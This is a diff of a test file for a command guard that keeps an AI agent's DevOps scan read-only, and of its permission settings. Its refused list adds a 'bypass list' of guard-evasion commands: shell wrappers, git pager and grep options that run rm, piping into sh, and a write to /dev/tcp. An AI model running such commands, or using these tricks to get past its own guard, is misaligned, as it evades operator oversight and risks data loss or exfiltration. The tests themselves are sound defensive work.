@@ -1,5 +1,7 @@
 import { describe, expect, it } from 'vitest';
+import { buildShiftSettings } from '../src/adapters/claude-policy.ts';
 import { classifyCommand, deleteRootsFor, type GuardConfig } from '../src/devops/guard.ts';
+import { POLICY_PATHS, policyCtx } from './policy-fixtures.ts';
 
 // "Scan with DevOps" is read-only (docs/design/deploy-run-ux-design.md section 5.2): the guard refuses what starts, builds,
 // installs, connects or writes, and lets reading through.
@@ -27,7 +29,6 @@ describe('a read-only scan', () => {
     'git -C /home/u/src/toy status --short',
     'git diff HEAD~1 --stat',
     'git branch --list',
-    'git config --get remote.origin.url',
     'docker version --format json',
     'docker compose ls --all',
     'docker compose -f docker-compose.yml config',
@@ -36,10 +37,12 @@ describe('a read-only scan', () => {
     'npm ls --depth=0',
     'npm --version',
     'aom setup propose --area run --file proposal.json',
-    `cat > ${SCRATCH}/proposal.json <<'EOF'\n{}\nEOF`,
-    'echo hi > /tmp/note.txt',
     'find . -name "*.csproj" -not -path "./node_modules/*"',
-    'python3 -c "import json,sys; json.load(open(\'p.json\'))"',
+    'git tag --list',
+    'git remote -v',
+    'docker inspect web',
+    'pnpm ls --depth 0',
+    'aom deploy probe --local',
     'echo hi 2>/dev/null',
   ];
   it.each(allowed)('lets %s through', (command) => {
@@ -74,6 +77,7 @@ describe('a read-only scan', () => {
     'git clean -fd',
     'git branch -D old',
     'git config user.name x',
+    'git config --get remote.origin.url',
     'git tag -d v1',
     'rm -rf node_modules',
     'mv a b',
@@ -94,6 +98,36 @@ describe('a read-only scan', () => {
     'ls $(npm ci)',
     'ls && docker compose down',
     'cat x | xargs rm',
+    // the review's bypass list
+    'bash -lc "npm ci"',
+    'sh -ec "ls"',
+    'npm version patch',
+    'npm pkg set scripts.x=y',
+    'git -c core.pager="rm -rf x" log',
+    "git grep -O'rm x' foo",
+    'git diff --output=/home/u/x',
+    'git branch x',
+    'git tag x',
+    'find . -delete',
+    'find . -exec rm {} ;',
+    'ls | xargs -I{} rm {}',
+    'env -u X rm y',
+    'cat x | sh',
+    './x',
+    'node -e 1',
+    'python3 -c 1',
+    'perl -e 1',
+    'awk BEGIN{system(1)}',
+    'eval ls',
+    'source x',
+    'echo hi > /tmp/note.txt',
+    'cat x > /dev/tcp/h/1',
+    'FOO=1 ls',
+    'rg --pre ./x foo',
+    'sort -o a b',
+    'docker -H ssh://h ps',
+    'docker compose up',
+    'docker run x',
   ];
   it.each(refused)('refuses %s', (command) => {
     const v = run(command);
@@ -111,5 +145,36 @@ describe('a read-only scan', () => {
     const v = run('cat x', cfg());
     expect(v.decision).toBe('allowed');
     expect(run('dropdb prod', cfg()).decision).toBe('refused');
+  });
+});
+
+describe('the scan profile of the DevOps settings', () => {
+  const settings = (scan: boolean) =>
+    buildShiftSettings(
+      {
+        allowedTools: ['read', 'edit', 'shell'],
+        deniedShellPatterns: [],
+        writableGlobs: null,
+        mayCommit: true,
+      } as never,
+      policyCtx(scan ? { readOnlyScan: true } : {}),
+      POLICY_PATHS,
+      'devops',
+      true,
+    );
+
+  it('writes only inside the scratch folder (Edit outside it is not allowed, NotebookEdit is denied)', () => {
+    const s = settings(true);
+    expect(s.permissions.allow).not.toContain('Edit');
+    expect(s.permissions.allow).toContain('Edit(//data/agents/a1/scratch/**)');
+    expect(s.permissions.allow).toContain('Write(//data/agents/a1/scratch/**)');
+    expect(s.permissions.deny).toContain('NotebookEdit');
+    expect(s.permissions.defaultMode).toBe('dontAsk');
+  });
+
+  it('an ordinary DevOps shift keeps its full Edit', () => {
+    const s = settings(false);
+    expect(s.permissions.allow).toContain('Edit');
+    expect(s.permissions.deny).not.toContain('NotebookEdit');
   });
 });
